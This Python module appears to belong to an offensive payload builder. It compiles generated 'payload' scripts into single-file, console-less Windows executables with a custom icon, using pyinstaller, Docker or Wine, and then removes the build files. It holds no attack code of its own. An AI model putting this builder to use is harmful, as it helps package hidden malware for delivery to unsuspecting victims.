import os
import platform
import subprocess
from Lib.Debugger import error

def check_wine() -> bool:
    try:
        result = subprocess.run(["wine", "--version"], capture_output=True, text=True)
        if result.returncode == 0 and "wine" in result.stdout:
            return True
        else:
            return False
    except FileNotFoundError:
        return False

def compile_with_docker(self, filename: str) -> None:
    docker_exists = os.system("docker --version")
    if docker_exists != 0:
        error("Docker is not installed or not available in the PATH")
        return

    dockerfile_content: str = (
        open(self.EXPLOIT + "_NCEXP/docker.dockerfile", "r")
        .read()
        .replace("{{filename}}", filename)
    )

    with open("Dockerfile", "w") as dockerfile:
        dockerfile.write(dockerfile_content)

    try:
        if os.system("docker build -t python-compiler .") != 0:
            error("Failed to build Docker image")
            return

        if os.system(f"docker run --rm -v %cd%:/app python-compiler") != 0:
            error("Failed to run Docker container")
            return

    finally:
        os.remove("Dockerfile")
        os.system("docker rmi python-compiler")
        os.remove(f"{filename}.py")
        os.remove(f"{filename}.spec")

def compile_payload(self, name, imports):
    system: str = platform.system()

    if imports == "":
        if system == "Windows":
            compile_with_docker(self, name)
        else:
            os.system(f"pyinstaller {name}.py --icon=Lib/icon.ico --name {name} --onefile --noconsole --hidden-import PIL --hidden-import GPUtil")
            os.remove(f"{name}.py")
            os.remove(f"{name}.spec")
    else:
        if system == "Windows":
            os.system(f"pyinstaller {name}.py --icon=Lib/icon.ico --name {name} --onefile --noconsole --hidden-import PIL --hidden-import GPUtil")
        else:
            if not check_wine():
                error("Please install wine to create a windows executable")
                return
            os.system(f"wine pyinstaller {name}.py --icon=Lib/icon.ico --name {name} --onefile --noconsole --hidden-import PIL --hidden-import GPUtil")

        os.remove(f"{name}.py")
        os.remove(f"{name}.spec")
